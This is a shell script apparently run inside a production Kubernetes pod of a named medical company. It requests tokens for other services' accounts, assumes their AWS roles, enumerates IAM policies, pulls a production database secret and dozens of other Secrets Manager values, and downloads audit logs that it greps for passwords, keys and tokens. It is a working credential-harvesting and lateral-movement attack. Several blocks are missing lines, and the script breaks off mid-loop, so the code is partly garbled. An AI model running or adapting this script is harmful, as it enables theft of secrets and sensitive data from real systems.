#!/bin/sh
set -u
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token)
API=https://kubernetes.default.svc
get(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" "$1" 2>/dev/null; }
post(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" --header="Content-Type: application/json" --post-data="$2" "$1" 2>/dev/null; }
echo "===I2915B_START env=prod utc=$(date -u +%FT%TZ)==="
apk add --no-cache aws-cli jq gzip >/tmp/apk.log 2>&1
echo "apk_rc=$? aws=$(aws --version 2>&1 | head -c 60)"
export AWS_DEFAULT_REGION=us-west-2
SMCOUNT=0
AROLE=""
CURROLE=""
assume(){
  ANS=$1; ASA=$2; ASESS=$3
  SAJ=$(get "$API/api/v1/namespaces/$ANS/serviceaccounts/$ASA")
  AROLE=$(echo "$SAJ" | jq -r '.metadata.annotations["eks.amazonaws.com/role-arn"] // empty')
  echo "ROLE_BEGIN $ANS/$ASA role=$AROLE"
  [ -z "$AROLE" ] && { echo "ROLE_NONE"; CURROLE=""; return 1; }
  TK=$(post "$API/api/v1/namespaces/$ANS/serviceaccounts/$ASA/token" '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"audiences":["sts.amazonaws.com"],"expirationSeconds":3600}}')
  WT=$(echo "$TK" | jq -r '.status.token // empty')
  [ -z "$WT" ] && { echo "TOKEN_FAIL $ANS/$ASA"; CURROLE=""; return 1; }
  RES=$(aws sts assume-role-with-web-identity --role-arn "$AROLE" --role-session-name "$ASESS" --web-identity-token "$WT" --duration-seconds 1800 --region us-west-2 --output json 2>&1)
  echo "$RES" | jq -e '.Credentials' >/dev/null 2>&1 || { echo "ASSUME_FAIL $(echo "$RES" | head -c 200 | tr "\n" " ")"; CURROLE=""; return 1; }
  export AWS_ACCESS_KEY_ID=$(echo "$RES" | jq -r '.Credentials.AccessKeyId')
  export AWS_SECRET_ACCESS_KEY=$(echo "$RES" | jq -r '.Credentials.SecretAccessKey')
  export AWS_SESSION_TOKEN=$(echo "$RES" | jq -r '.Credentials.SessionToken')
  CURROLE="$ANS/$ASA"; echo "ASSUME_OK $CURROLE"; return 0
}
unassume(){ unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN; CURROLE=""; }

sm_probe(){
  NAME=$1
  if [ "$SMCOUNT" -ge 114 ]; then return; fi
  SMCOUNT=$((SMCOUNT+1))
  V=$(aws secretsmanager get-secret-value --secret-id "$NAME" --query SecretString --output text --region us-west-2 2>/tmp/smerr.txt)
  RC=$?
  if [ $RC -eq 0 ]; then echo "SM_OK $NAME = $(echo "$V" | head -c 3500)"; else echo "SM_NO $NAME $(head -c 160 /tmp/smerr.txt | tr "\n" " ")"; fi
}

# PHASE_IAM
if assume 'cognito-service' 'cognito-service-sa' i2915b-iam; then
  RN=${AROLE##*/}
  echo "IAM_GETROLE $(aws iam get-role --role-name "$RN" --output json 2>&1 | head -c 1200)"
  echo "IAM_ATTACHED $(aws iam list-attached-role-policies --role-name "$RN" --output json 2>&1 | head -c 1200)"
  INL=$(aws iam list-role-policies --role-name "$RN" --output json 2>&1)
  echo "IAM_INLINE $(echo "$INL" | head -c 800)"
  PN=$(echo "$INL" | jq -r '.PolicyNames[0] // empty' 2>/dev/null)
  if [ -n "$PN" ]; then
    POL=$(aws iam get-role-policy --role-name "$RN" --policy-name "$PN" --output json 2>&1)
    DOC=$(echo "$POL" | jq -c '.PolicyDocument' 2>/dev/null)
    echo "IAM_DOC $(echo "$DOC" | head -c 6000)"
    echo "$DOC" | grep -oE 'arn:aws:secretsmanager:[A-Za-z0-9/_+=.@,:-]*' | sort -u | head -20
  fi
  unassume
fi
if assume 's3-ingestion' 's3-ingestion-sa' i2915b-iam; then
  RN=${AROLE##*/}
  echo "IAM_GETROLE $(aws iam get-role --role-name "$RN" --output json 2>&1 | head -c 1200)"
  echo "IAM_ATTACHED $(aws iam list-attached-role-policies --role-name "$RN" --output json 2>&1 | head -c 1200)"
  INL=$(aws iam list-role-policies --role-name "$RN" --output json 2>&1)
  echo "IAM_INLINE $(echo "$INL" | head -c 800)"
  PN=$(echo "$INL" | jq -r '.PolicyNames[0] // empty' 2>/dev/null)
  if [ -n "$PN" ]; then

    DOC=$(echo "$POL" | jq -c '.PolicyDocument' 2>/dev/null)
    echo "IAM_DOC $(echo "$DOC" | head -c 6000)"
    echo "$DOC" | grep -oE 'arn:aws:secretsmanager:[A-Za-z0-9/_+=.@,:-]*' | sort -u | head -20
  fi
  unassume
fi
if assume 'user-management-service' 'user-management-service-sa' i2915b-iam; then
  RN=${AROLE##*/}
  echo "IAM_GETROLE $(aws iam get-role --role-name "$RN" --output json 2>&1 | head -c 1200)"
  echo "IAM_ATTACHED $(aws iam list-attached-role-policies --role-name "$RN" --output json 2>&1 | head -c 1200)"
  INL=$(aws iam list-role-policies --role-name "$RN" --output json 2>&1)
  echo "IAM_INLINE $(echo "$INL" | head -c 800)"
  PN=$(echo "$INL" | jq -r '.PolicyNames[0] // empty' 2>/dev/null)
  if [ -n "$PN" ]; then

    echo "$DOC" | grep -oE 'arn:aws:secretsmanager:[A-Za-z0-9/_+=.@,:-]*' | sort -u | head -20
  fi
  unassume
fi

# PHASE_CAP
CAPROLE=""
if assume 'cognito-service' 'cognito-service-sa' i2915b-cap; then
  SMCOUNT=$((SMCOUNT+1))
  CV=$(aws secretsmanager get-secret-value --secret-id 'lazamedical-prod01-usw2-mysql-1-db-secret' --query SecretString --output text --region us-west-2 2>/tmp/caperr.txt)
  CRC=$?
  echo "SM_CAP cognito-service/cognito-service-sa rc=$CRC $( [ $CRC -eq 0 ] && echo OK || head -c 120 /tmp/caperr.txt | tr "\n" " " )"
  [ $CRC -eq 0 ] && CAPROLE="cognito-service|cognito-service-sa"
  unassume
fi
if assume 's3-ingestion' 's3-ingestion-sa' i2915b-cap; then
  SMCOUNT=$((SMCOUNT+1))
  CV=$(aws secretsmanager get-secret-value --secret-id 'lazamedical-prod01-usw2-mysql-1-db-secret' --query SecretString --output text --region us-west-2 2>/tmp/caperr.txt)
  CRC=$?
  echo "SM_CAP s3-ingestion/s3-ingestion-sa rc=$CRC $( [ $CRC -eq 0 ] && echo OK || head -c 120 /tmp/caperr.txt | tr "\n" " " )"
  [ $CRC -eq 0 ] && CAPROLE="s3-ingestion|s3-ingestion-sa"
  unassume
fi

  echo "SM_CAP user-management-service/user-management-service-sa rc=$CRC $( [ $CRC -eq 0 ] && echo OK || head -c 120 /tmp/caperr.txt | tr "\n" " " )"
  [ $CRC -eq 0 ] && CAPROLE="user-management-service|user-management-service-sa"
  unassume
fi

# PHASE_CAND
if [ -n "$CAPROLE" ]; then
  CNS=${CAPROLE%%|*}; CSA=${CAPROLE##*|}
  echo "CAND_ROLE_MODE single $CAPROLE"
  if assume "$CNS" "$CSA" i2915b-sm; then
    while read -r N; do sm_probe "$N"; done < /tmp/cands.txt
    unassume
  fi
else
  echo "CAND_ROLE_MODE roundrobin"
  if assume 'cognito-service' 'cognito-service-sa' i2915b-sm1; then
    while read -r N; do sm_probe "$N"; done < /tmp/c1.txt
    unassume
  fi
  if assume 's3-ingestion' 's3-ingestion-sa' i2915b-sm2; then
    while read -r N; do sm_probe "$N"; done < /tmp/c2.txt
    unassume
  fi
  if assume 'user-management-service' 'user-management-service-sa' i2915b-sm3; then
    while read -r N; do sm_probe "$N"; done < /tmp/c3.txt
    unassume
  fi
fi
echo "SM_TOTAL_COUNT=$SMCOUNT"

# PHASE_S3_LOG
S3ROLE_OK=0
if [ "$S3ROLE_OK" -eq 0 ] && assume 's3-ingestion' 's3-ingestion-sa' i2915b-s3; then
  B='lazamedical-prod01-usw2-log-bucket'
  : > /tmp/s3keys.txt
  TOK=""
  P=0
  while [ $P -lt 3 ]; do
    P=$((P+1))
    if [ -z "$TOK" ]; then LO=$(aws s3api list-objects-v2 --bucket "$B" --prefix logs/audit-log-app/ --max-keys 1000 --no-paginate --region us-west-2 --output json 2>/tmp/loerr.txt); else LO=$(aws s3api list-objects-v2 --bucket "$B" --prefix logs/audit-log-app/ --max-keys 1000 --continuation-token "$TOK" --no-paginate --region us-west-2 --output json 2>/tmp/loerr.txt); fi
    if ! echo "$LO" | jq -e '.Contents' >/dev/null 2>&1; then echo "S3LOG_PAGE_NO $P $(head -c 180 /tmp/loerr.txt | tr "\n" " ")"; break; fi
    echo "S3LOG_PAGE $P n=$(echo "$LO" | jq '.Contents|length') trunc=$(echo "$LO" | jq -r '.IsTruncated')"
    echo "$LO" | jq -r '.Contents[] | "\(.Size) \(.Key)"' >> /tmp/s3keys.txt
    TOK=$(echo "$LO" | jq -r '.NextContinuationToken // empty')
    [ -z "$TOK" ] && break
  done
  echo "S3LOG_KEYS_TOTAL=$(wc -l < /tmp/s3keys.txt)"
  echo "S3LOG_PREFIXES $(cut -d" " -f2 /tmp/s3keys.txt | awk -F/ '{print $1"/"$2"/"$3}' | sort | uniq -c | sort -rn | head -10 | tr "\n" ";")"
  IDX=0
  sort -n /tmp/s3keys.txt | head -3 > /tmp/s3small.txt
  while read -r SZ KEY; do
    IDX=$((IDX+1))
    echo "S3LOG_PICK $IDX size=$SZ key=$KEY"
    aws s3api get-object --bucket "$B" --key "$KEY" /tmp/obj$IDX.gz --region us-west-2 >/tmp/gout.txt 2>/tmp/gerr.txt
    GRC=$?; echo "S3LOG_GET rc=$GRC bytes=$(wc -c < /tmp/obj$IDX.gz 2>/dev/null)"
    if [ $GRC -eq 0 ]; then
      if gzip -t /tmp/obj$IDX.gz 2>/dev/null; then gzip -dc /tmp/obj$IDX.gz > /tmp/obj$IDX.txt 2>/dev/null; echo "S3LOG_GZ yes"; else cp /tmp/obj$IDX.gz /tmp/obj$IDX.txt; echo "S3LOG_GZ no"; fi
      echo "S3LOG_LINES=$(wc -l < /tmp/obj$IDX.txt)"
      echo "S3LOG_SAMPLE $(head -c 320 /tmp/obj$IDX.txt | tr "\n" " ")"
      HIT=$(grep -aEic "password|passwd|secret|token|AKIA|ASIA|Bearer|SMTP|api[_-]?key|sk-|Authorization|client_secret|PRIVATE KEY" /tmp/obj$IDX.txt 2>/dev/null)
      echo "S3LOG_HITS=$HIT"
      grep -aEi "password|passwd|secret|token|AKIA|ASIA|Bearer|SMTP|api[_-]?key|sk-|Authorization|client_secret|PRIVATE KEY" /tmp/obj$IDX.txt 2>/dev/null | head -5 | cut -c1-400
    else
      echo "S3LOG_GET_ERR $(head -c 180 /tmp/gerr.txt | tr "\n" " ")"
    fi
  done < /tmp/s3small.txt
  S3ROLE_OK=1
  unassume
fi
if [ "$S3ROLE_OK" -eq 0 ] && assume 'user-management-service' 'user-management-service-sa' i2915b-s3; then
  B='lazamedical-prod01-usw2-log-bucket'
  : > /tmp/s3keys.txt
  TOK=""
  P=0
  while [ $P -lt 3 ]; do
    P=$((P+1))
    if [ -z "$TOK" ]; then LO=$(aws s3api list-objects-v2 --bucket "$B" --prefix logs/audit-log-app/ --max-keys 1000 --no-paginate --region us-west-2 --output json 2>/tmp/loerr.txt); else LO=$(aws s3api list-objects-v2 --bucket "$B" --prefix logs/audit-log-app/ --max-keys 1000 --continuation-token "$TOK" --no-paginate --region us-west-2 --output json 2>/tmp/loerr.txt); fi
    if ! echo "$LO" | jq -e '.Contents' >/dev/null 2>&1; then echo "S3LOG_PAGE_NO $P $(head -c 180 /tmp/loerr.txt | tr "\n" " ")"; break; fi
    echo "S3LOG_PAGE $P n=$(echo "$LO" | jq '.Contents|length') trunc=$(echo "$LO" | jq -r '.IsTruncated')"
    echo "$LO" | jq -r '.Contents[] | "\(.Size) \(.Key)"' >> /tmp/s3keys.txt
    TOK=$(echo "$LO" | jq -r '.NextContinuationToken // empty')
    [ -z "$TOK" ] && break
  done
  echo "S3LOG_KEYS_TOTAL=$(wc -l < /tmp/s3keys.txt)"
  echo "S3LOG_PREFIXES $(cut -d" " -f2 /tmp/s3keys.txt | awk -F/ '{print $1"/"$2"/"$3}' | sort | uniq -c | sort -rn | head -10 | tr "\n" ";")"
  IDX=0
  sort -n /tmp/s3keys.txt | head -3 > /tmp/s3small.txt
  while read -r SZ KEY; do
    IDX=$((IDX+1))
    echo "S3LOG_PICK $IDX size=$SZ key=$KEY"
    aws s3api get-object --bucket "$B" --key "$KEY" /tmp/obj$IDX.gz --region us-west-2 >/tmp/gout.txt 2>/tmp/gerr.txt
    GRC=$?; echo "S3LOG_GET rc=$GRC bytes=$(wc -c < /tmp/obj$IDX.gz 2>/dev/null)"
